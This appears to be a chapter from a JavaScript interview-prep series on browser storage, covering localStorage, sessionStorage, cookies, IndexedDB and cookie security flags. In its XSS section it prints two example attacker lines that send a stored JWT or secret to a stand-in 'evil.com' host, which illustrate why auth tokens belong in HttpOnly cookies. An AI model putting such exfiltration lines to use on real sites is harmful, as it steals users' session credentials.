# Chapter 10: Storage APIs

> **Target:** Frontend Developer (4+ years) | Interview-focused, practical explanations

---

## Table of Contents

- [Storage Fundamentals](#storage-fundamentals)
- [Security Considerations](#security-considerations)
- [IndexedDB](#indexeddb)
- [Real-World Usage](#real-world-usage)

---

## Storage Fundamentals

<details>
<summary><strong>1. What are the different client-side storage options available in browsers?</strong></summary>

| Storage | Capacity | Persistence | Accessible from | Server sent? |
|---------|----------|-------------|-----------------|--------------|
| **localStorage** | ~5–10MB | Until cleared | Same origin | No |
| **sessionStorage** | ~5–10MB | Tab session | Same origin, same tab | No |
| **Cookies** | ~4KB | Configurable expiry | Same origin | Yes (HTTP) |
| **IndexedDB** | 50MB+ (negotiated) | Until cleared | Same origin | No |
| **Cache API** | Large (disk-limited) | Until cleared | Service Workers | No |
| **Memory** | RAM-limited | Page lifetime | In-page JS | No |

Each solves a different problem — there's no single best choice for everything.

</details>

---

<details>
<summary><strong>2. What is <code>localStorage</code> and when would you use it?</strong></summary>

`localStorage` is a synchronous key-value store that **persists indefinitely** across sessions, tabs, and browser restarts (until explicitly cleared or user clears browser data).

```js
// All keys and values must be strings
localStorage.setItem('theme', 'dark');
localStorage.setItem('user', JSON.stringify({ id: 1, name: 'Alice' }));

localStorage.getItem('theme');                      // 'dark'
JSON.parse(localStorage.getItem('user'));            // { id: 1, name: 'Alice' }

localStorage.removeItem('theme');
localStorage.clear(); // removes all items for this origin

localStorage.length;     // number of items
localStorage.key(0);     // first key

// Iterate all
for (let i = 0; i < localStorage.length; i++) {
  const key = localStorage.key(i);
  const val = localStorage.getItem(key);
}
```

**Use cases:** Theme preference, language preference, UI state (sidebar collapsed), non-sensitive user preferences, anonymous user ID.

> **Common Mistake:** `localStorage` only stores strings. Storing objects without `JSON.stringify` results in `"[object Object]"`.

</details>

---

<details>
<summary><strong>3. What is <code>sessionStorage</code> and when would you use it?</strong></summary>

`sessionStorage` works identically to `localStorage` but data is **scoped to the current tab session** — cleared when the tab or browser is closed. It's also **not shared between tabs** (even on the same origin).

```js
// Same API as localStorage
sessionStorage.setItem('step', '2');     // multi-step form progress
sessionStorage.getItem('step');          // '2'
sessionStorage.removeItem('step');
sessionStorage.clear();
```

**Use cases:**
- Multi-step wizard / form state (lost if user closes tab — intentional)
- Temporary search filters
- One-time page state (scroll position in a session)
- Preventing data leakage across tabs (e.g., different users in different tabs)

</details>

---

<details>
<summary><strong>4. What is the difference between <code>localStorage</code> and <code>sessionStorage</code>?</strong></summary>

| | `localStorage` | `sessionStorage` |
|--|---------------|-----------------|
| **Persistence** | Until explicitly cleared | Tab/window close |
| **Shared across tabs** | Yes (same origin) | No — per tab |
| **Shared across windows** | Yes | No |
| **Survives refresh** | Yes | Yes |
| **Survives browser restart** | Yes | No |
| **Capacity** | ~5–10MB | ~5–10MB |
| **API** | Identical | Identical |

```js
// Same-origin, different tabs:
// Tab A: localStorage.setItem('x', '1')
// Tab B: localStorage.getItem('x') → '1' ✅ (shared)

// Tab A: sessionStorage.setItem('x', '1')
// Tab B: sessionStorage.getItem('x') → null (not shared)
```

</details>

---

<details>
<summary><strong>5 & 6. What are Cookies? Difference between Cookies and Web Storage?</strong></summary>

**Cookies** are small pieces of data (max ~4KB) sent by the server and stored by the browser. They're automatically included in every HTTP request to the same domain.

```js
// Setting cookies via JavaScript
document.cookie = 'name=Alice; expires=Fri, 31 Dec 2025 23:59:59 GMT; path=/';
document.cookie = 'theme=dark; max-age=31536000; SameSite=Lax';

// Reading cookies (returns all as one string)
document.cookie; // 'name=Alice; theme=dark'

// Deleting — set max-age=0
document.cookie = 'name=; max-age=0';
```

| | Cookies | localStorage / sessionStorage |
|--|---------|-------------------------------|
| **Capacity** | ~4KB | ~5–10MB |
| **Sent to server** | Yes (every request) | No |
| **Expiry** | Configurable | localStorage: never; session: tab close |
| **Access** | JS + Server | JS only |
| **HttpOnly** | Can be JS-inaccessible | Always JS-accessible |
| **Best for** | Auth tokens, server-read data | Client-only preferences |

</details>

---

## Security Considerations

<details>
<summary><strong>7 & 8. What data should never be stored in localStorage? Why is storing JWT in localStorage risky?</strong></summary>

**Never store in localStorage:**
- Passwords or password hashes
- Credit card numbers
- PII (SSN, medical info)
- Auth tokens (if XSS is possible)
- Private keys / secrets

**The JWT + localStorage problem:**

`localStorage` is accessible to any JavaScript on the page. If your app has an XSS vulnerability, an attacker can run:
```js
// Attacker's script
fetch('https://evil.com?token=' + localStorage.getItem('jwt'));
// JWT is stolen — attacker is now logged in as the user
```

**Safer alternatives:**
```js
// HttpOnly cookie — JS cannot read it
// Server sets: Set-Cookie: token=xxx; HttpOnly; Secure; SameSite=Strict
// Browser sends it automatically with requests
// XSS cannot steal it — JS access blocked

// In-memory storage — gone on page refresh (requires re-auth)
let authToken = null; // only in JS memory, not in any storage
```

> **Interview Note:** The industry best practice debate: "JWT in localStorage vs HttpOnly cookie." The HttpOnly cookie wins on XSS protection — but cookies introduce CSRF risk. The answer is HttpOnly + SameSite=Strict/Lax cookies.

</details>

---

<details>
<summary><strong>9. What is XSS and how does it impact browser storage?</strong></summary>

**XSS (Cross-Site Scripting)** — an attacker injects malicious JavaScript into your page, which then runs in the user's browser with full access to your JS context.

```js
// Vulnerable code — unsanitized user input in DOM
element.innerHTML = userInput; // ❌ if userInput = '<script>...</script>'

// Attacker's injected code can:
localStorage.getItem('jwt');         // steal tokens
document.cookie;                     // steal non-HttpOnly cookies
fetch('evil.com', { body: secret }); // exfiltrate data
```

**Impact on storage:**
- `localStorage` — fully exposed (XSS can read/write all)
- `sessionStorage` — fully exposed
- Regular cookies — exposed if not `HttpOnly`
- `HttpOnly` cookies — **not accessible to JS**, XSS-safe

**Prevention:**
- Sanitize all user input before rendering (use `textContent` not `innerHTML`)
- Content Security Policy (CSP) headers
- DOMPurify library for rich text
- Avoid `eval`, `innerHTML`, `dangerouslySetInnerHTML` with unsanitized data

</details>

---

<details>
<summary><strong>10. What are HttpOnly, Secure, and SameSite cookies?</strong></summary>

```
Set-Cookie: token=abc123; HttpOnly; Secure; SameSite=Strict; Max-Age=3600
```

| Attribute | Effect |
|-----------|--------|
| **HttpOnly** | JS cannot read/write — `document.cookie` won't see it. Protects against XSS token theft. |
| **Secure** | Cookie sent only over HTTPS. Prevents interception on HTTP. |
| **SameSite=Strict** | Cookie sent only for same-site requests — prevents CSRF completely. May break OAuth flows. |
| **SameSite=Lax** | Sent for same-site + top-level navigation (GET from another site). Balanced protection. |
| **SameSite=None** | Sent cross-site — must have `Secure`. Required for cross-site embeds/iframes. |

**The secure auth cookie setup:**
```
HttpOnly       → XSS cannot steal it
Secure         → only HTTPS
SameSite=Lax   → balanced CSRF protection
Short Max-Age  → minimizes exposure window
```

</details>

---

## IndexedDB

<details>
<summary><strong>11 & 12. What is IndexedDB? Difference from localStorage?</strong></summary>

`IndexedDB` is a low-level, transactional, async database in the browser for storing significant amounts of structured data.

```js
// IndexedDB — async, structured, queryable
const request = indexedDB.open('MyDB', 1);

request.onupgradeneeded = e => {
  const db = e.target.result;
  const store = db.createObjectStore('users', { keyPath: 'id' });
  store.createIndex('name', 'name', { unique: false });
};

request.onsuccess = e => {
  const db = e.target.result;
  const tx = db.transaction('users', 'readwrite');
  const store = tx.objectStore('users');

  store.add({ id: 1, name: 'Alice', age: 30 });
  store.get(1).onsuccess = e => console.log(e.target.result);
};
```

| | localStorage | IndexedDB |
|--|-------------|-----------|
| **Capacity** | ~5–10MB | 50MB+ |
| **Data types** | Strings only | Any structured data |
| **API** | Synchronous | Asynchronous |
| **Queryable** | No (key only) | Yes (indexes, ranges) |
| **Transactions** | No | Yes |
| **Best for** | Simple key-value | Large structured datasets |

</details>

---

<details>
<summary><strong>13. When would you choose IndexedDB over localStorage?</strong></summary>

**Use IndexedDB when:**
- Storing more than a few KB of data
- Data is structured (objects, arrays) and needs querying
- You need offline-first functionality (PWA)
- Storing binary data (images, files, audio)
- Need transactional guarantees

```js
// ✅ IndexedDB use cases
// - Offline-capable email client (thousands of emails)
// - Progressive Web App (PWA) caching strategy
// - Browser-based IDE (storing project files)
// - Local database for data-heavy dashboards

// ✅ localStorage use cases
// - Theme preference: { mode: 'dark' }
// - Language: 'en-US'
// - Last visited: '/dashboard'
```

**Libraries that abstract IndexedDB complexity:**
- **idb** (tiny wrapper by Jake Archibald)
- **Dexie.js** (full-featured ORM-like API)
- **localForage** (fallback: IndexedDB → WebSQL → localStorage)

</details>

---

## Real-World Usage

<details>
<summary><strong>14. How do you handle data expiration in localStorage?</strong></summary>

`localStorage` has no built-in TTL. You must implement expiration manually.

```js
// Store with timestamp
function setWithExpiry(key, value, ttlMs) {
  const item = {
    value,
    expiry: Date.now() + ttlMs
  };
  localStorage.setItem(key, JSON.stringify(item));
}

function getWithExpiry(key) {
  const raw = localStorage.getItem(key);
  if (!raw) return null;

  const item = JSON.parse(raw);
  if (Date.now() > item.expiry) {
    localStorage.removeItem(key); // clean up
    return null;
  }
  return item.value;
}

// Usage
setWithExpiry('cachedResults', data, 5 * 60 * 1000); // 5 min TTL
const cached = getWithExpiry('cachedResults'); // null if expired
```

</details>

---

<details>
<summary><strong>15 & 16. How can you sync localStorage across tabs? What is the storage event?</strong></summary>

The `storage` event fires in **other tabs/windows** (not the one that made the change) when `localStorage` is modified.

```js
// Tab A — makes a change
localStorage.setItem('theme', 'dark');

// Tab B — receives the event
window.addEventListener('storage', e => {
  console.log(e.key);      // 'theme'
  console.log(e.oldValue); // 'light'
  console.log(e.newValue); // 'dark'
  console.log(e.url);      // URL of the tab that changed it

  if (e.key === 'theme') {
    applyTheme(e.newValue); // sync UI
  }
});
```

**Use cases:**
- Sync auth state — log out in all tabs when one logs out
- Sync theme changes
- Real-time collaboration features within the same browser

> **Note:** The `storage` event does NOT fire in the tab that made the change. To sync the current tab too, update state directly (don't rely on the event).

</details>

---

<details>
<summary><strong>17. How would you persist application state across page refreshes?</strong></summary>

```js
// Simple approach — manual serialize/deserialize
function saveState(state) {
  localStorage.setItem('appState', JSON.stringify(state));
}

function loadState() {
  try {
    const serialized = localStorage.getItem('appState');
    return serialized ? JSON.parse(serialized) : undefined;
  } catch {
    return undefined;
  }
}

// With Redux
const store = createStore(
  rootReducer,
  loadState(), // preloaded state from storage
);

store.subscribe(() => {
  saveState(store.getState());
  // Optimize: debounce to avoid saving on every action
});

// With Zustand — built-in persist middleware
import { persist } from 'zustand/middleware';
const useStore = create(persist(
  (set) => ({ count: 0, increment: () => set(s => ({ count: s.count + 1 })) }),
  { name: 'app-storage' }
));
```

</details>

---

<details>
<summary><strong>18. How would you choose between Cookies, localStorage, sessionStorage, and IndexedDB?</strong></summary>

```
Need to send data to server automatically?
  → Cookie (HttpOnly for auth tokens)

Need data to survive browser close?
  → localStorage or Cookie with expiry

Need data only for this tab/session?
  → sessionStorage

Need to store large or structured data?
  → IndexedDB

Need offline capability (PWA)?
  → IndexedDB + Cache API (Service Worker)

Simple string key-value, stays client-side?
  → localStorage
```

| Scenario | Best choice |
|----------|------------|
| JWT / session token | HttpOnly Cookie |
| Theme / language preference | localStorage |
| Multi-step form (this session) | sessionStorage |
| Product catalog (offline PWA) | IndexedDB |
| User profile (small, persistent) | localStorage |
| File uploads (in-progress) | IndexedDB |

</details>

---

## Quick Reference Cheat Sheet

```
localStorage:
  setItem(key, value)  getItem(key)  removeItem(key)  clear()
  Persists forever | ~5MB | Same origin | Sync | String values only

sessionStorage:
  Same API | Cleared on tab close | Not shared between tabs

Cookies:
  document.cookie = 'key=val; options'
  Max-Age, Expires, HttpOnly, Secure, SameSite, Path, Domain
  ~4KB | Sent with every request | Server-readable

Security flags:
  HttpOnly  → JS cannot read (XSS protection)
  Secure    → HTTPS only
  SameSite=Strict → no cross-site (best CSRF protection)
  SameSite=Lax    → balanced (recommended default)

Storage event → fires in OTHER tabs when localStorage changes
```

---

*Chapter 10 of JavaScript Interview Prep Series*
